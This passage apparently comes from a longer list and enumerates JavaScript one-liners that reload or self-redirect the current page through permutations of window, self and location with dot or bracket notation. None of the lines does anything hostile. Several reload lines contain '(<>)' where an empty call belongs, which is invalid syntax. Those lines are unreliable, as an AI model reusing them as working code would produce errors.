- window['location'].href = self.location['href']
- location.assign(window['location'].href)
- location.replace(window['location'].href)
- window.location.assign(window['location'].href)
- window.location.replace(window['location'].href)
- self.location.assign(window['location'].href)
- self.location.replace(window['location'].href)
- location['assign'](window['location'].href)
- location['replace'](window['location'].href)
- window.location['assign'](window['location'].href)
- window.location['replace'](window['location'].href)
- window['location'].assign(window['location'].href)
- window['location'].replace(window['location'].href)
- window['location']['assign'](window['location'].href)
- window['location']['replace'](window['location'].href)
- self.location['assign'](window['location'].href)
- self.location['replace'](window['location'].href)
- self['location'].assign(window['location'].href)
- self['location'].replace(window['location'].href)
- self['location']['assign'](window['location'].href)
- self['location']['replace'](window['location'].href)
- window['location']['href'] = location
- window['location']['href'] = location.href
- window['location']['href'] = window.location
- window['location']['href'] = self.location
- window['location']['href'] = window.location.href
- window['location']['href'] = self.location.href
- window['location']['href'] = location['href']
- window['location']['href'] = window['location']
- window['location']['href'] = window['location'].href
- window['location']['href'] = window['location']['href']
- window['location']['href'] = window.location['href']
- window['location']['href'] = self['location']
- window['location']['href'] = self['location'].href
- window['location']['href'] = self['location']['href']
- window['location']['href'] = self.location['href']
- location.assign(window['location']['href'])
- location.replace(window['location']['href'])
- window.location.assign(window['location']['href'])
- window.location.replace(window['location']['href'])
- self.location.assign(window['location']['href'])
- self.location.replace(window['location']['href'])
- location['assign'](window['location']['href'])
- location['replace'](window['location']['href'])
- window.location['assign'](window['location']['href'])
- window.location['replace'](window['location']['href'])
- window['location'].assign(window['location']['href'])
- window['location'].replace(window['location']['href'])
- window['location']['assign'](window['location']['href'])
- window['location']['replace'](window['location']['href'])
- self.location['assign'](window['location']['href'])
- self.location['replace'](window['location']['href'])
- self['location'].assign(window['location']['href'])
- self['location'].replace(window['location']['href'])
- self['location']['assign'](window['location']['href'])
- self['location']['replace'](window['location']['href'])
- window.location['href'] = location
- window.location['href'] = location.href
- window.location['href'] = window.location
- window.location['href'] = self.location
- window.location['href'] = window.location.href
- window.location['href'] = self.location.href
- window.location['href'] = location['href']
- window.location['href'] = window['location']
- window.location['href'] = window['location'].href
- window.location['href'] = window['location']['href']
- window.location['href'] = window.location['href']
- window.location['href'] = self['location']
- window.location['href'] = self['location'].href
- window.location['href'] = self['location']['href']
- window.location['href'] = self.location['href']
- location.assign(window.location['href'])
- location.replace(window.location['href'])
- window.location.assign(window.location['href'])
- window.location.replace(window.location['href'])
- self.location.assign(window.location['href'])
- self.location.replace(window.location['href'])
- location['assign'](window.location['href'])
- location['replace'](window.location['href'])
- window.location['assign'](window.location['href'])
- window.location['replace'](window.location['href'])
- window['location'].assign(window.location['href'])
- window['location'].replace(window.location['href'])
- window['location']['assign'](window.location['href'])
- window['location']['replace'](window.location['href'])
- self.location['assign'](window.location['href'])
- self.location['replace'](window.location['href'])
- self['location'].assign(window.location['href'])
- self['location'].replace(window.location['href'])
- self['location']['assign'](window.location['href'])
- self['location']['replace'](window.location['href'])
- self['location'] = location
- self['location'] = location.href
- self['location'] = window.location
- self['location'] = self.location
- self['location'] = window.location.href
- self['location'] = self.location.href
- self['location'] = location['href']
- self['location'] = window['location']
- self['location'] = window['location'].href
- self['location'] = window['location']['href']
- self['location'] = window.location['href']
- self['location'] = self['location']
- self['location'] = self['location'].href
- self['location'] = self['location']['href']
- self['location'] = self.location['href']
- location.assign(self['location'])
- location.replace(self['location'])
- window.location.assign(self['location'])
- window.location.replace(self['location'])
- self.location.assign(self['location'])
- self.location.replace(self['location'])
- location['assign'](self['location'])
- location['replace'](self['location'])
- window.location['assign'](self['location'])
- window.location['replace'](self['location'])
- window['location'].assign(self['location'])
- window['location'].replace(self['location'])
- window['location']['assign'](self['location'])
- window['location']['replace'](self['location'])
- self.location['assign'](self['location'])
- self.location['replace'](self['location'])
- self['location'].assign(self['location'])
- self['location'].replace(self['location'])
- self['location']['assign'](self['location'])
- self['location']['replace'](self['location'])
- self['location'].href = location
- self['location'].href = location.href
- self['location'].href = window.location
- self['location'].href = self.location
- self['location'].href = window.location.href
- self['location'].href = self.location.href
- self['location'].href = location['href']
- self['location'].href = window['location']
- self['location'].href = window['location'].href
- self['location'].href = window['location']['href']
- self['location'].href = window.location['href']
- self['location'].href = self['location']
- self['location'].href = self['location'].href
- self['location'].href = self['location']['href']
- self['location'].href = self.location['href']
- location.assign(self['location'].href)
- location.replace(self['location'].href)
- window.location.assign(self['location'].href)
- window.location.replace(self['location'].href)
- self.location.assign(self['location'].href)
- self.location.replace(self['location'].href)
- location['assign'](self['location'].href)
- location['replace'](self['location'].href)
- window.location['assign'](self['location'].href)
- window.location['replace'](self['location'].href)
- window['location'].assign(self['location'].href)
- window['location'].replace(self['location'].href)
- window['location']['assign'](self['location'].href)
- window['location']['replace'](self['location'].href)
- self.location['assign'](self['location'].href)
- self.location['replace'](self['location'].href)
- self['location'].assign(self['location'].href)
- self['location'].replace(self['location'].href)
- self['location']['assign'](self['location'].href)
- self['location']['replace'](self['location'].href)
- self['location']['href'] = location
- self['location']['href'] = location.href
- self['location']['href'] = window.location
- self['location']['href'] = self.location
- self['location']['href'] = window.location.href
- self['location']['href'] = self.location.href
- self['location']['href'] = location['href']
- self['location']['href'] = window['location']
- self['location']['href'] = window['location'].href
- self['location']['href'] = window['location']['href']
- self['location']['href'] = window.location['href']
- self['location']['href'] = self['location']
- self['location']['href'] = self['location'].href
- self['location']['href'] = self['location']['href']
- self['location']['href'] = self.location['href']
- location.assign(self['location']['href'])
- location.replace(self['location']['href'])
- window.location.assign(self['location']['href'])
- window.location.replace(self['location']['href'])
- self.location.assign(self['location']['href'])
- self.location.replace(self['location']['href'])
- location['assign'](self['location']['href'])
- location['replace'](self['location']['href'])
- window.location['assign'](self['location']['href'])
- window.location['replace'](self['location']['href'])
- window['location'].assign(self['location']['href'])
- window['location'].replace(self['location']['href'])
- window['location']['assign'](self['location']['href'])
- window['location']['replace'](self['location']['href'])
- self.location['assign'](self['location']['href'])
- self.location['replace'](self['location']['href'])
- self['location'].assign(self['location']['href'])
- self['location'].replace(self['location']['href'])
- self['location']['assign'](self['location']['href'])
- self['location']['replace'](self['location']['href'])
- self.location['href'] = location
- self.location['href'] = location.href
- self.location['href'] = window.location
- self.location['href'] = self.location
- self.location['href'] = window.location.href
- self.location['href'] = self.location.href
- self.location['href'] = location['href']
- self.location['href'] = window['location']
- self.location['href'] = window['location'].href
- self.location['href'] = window['location']['href']
- self.location['href'] = window.location['href']
- self.location['href'] = self['location']
- self.location['href'] = self['location'].href
- self.location['href'] = self['location']['href']
- self.location['href'] = self.location['href']
- location.assign(self.location['href'])
- location.replace(self.location['href'])
- window.location.assign(self.location['href'])
- window.location.replace(self.location['href'])
- self.location.assign(self.location['href'])
- self.location.replace(self.location['href'])
- location['assign'](self.location['href'])
- location['replace'](self.location['href'])
- window.location['assign'](self.location['href'])
- window.location['replace'](self.location['href'])
- window['location'].assign(self.location['href'])
- window['location'].replace(self.location['href'])
- window['location']['assign'](self.location['href'])
- window['location']['replace'](self.location['href'])
- self.location['assign'](self.location['href'])
- self.location['replace'](self.location['href'])
- self['location'].assign(self.location['href'])
- self['location'].replace(self.location['href'])
- self['location']['assign'](self.location['href'])
- self['location']['replace'](self.location['href'])
- location.reload()
- location['reload'](<>)
- window.location.reload()
- window['location'].reload()
- window.location['reload'](<>)
- window['location']['reload']()
- self.location.reload()
- self['location'].reload()
- self.location['reload'](<>)
- self['location']['reload']()
```
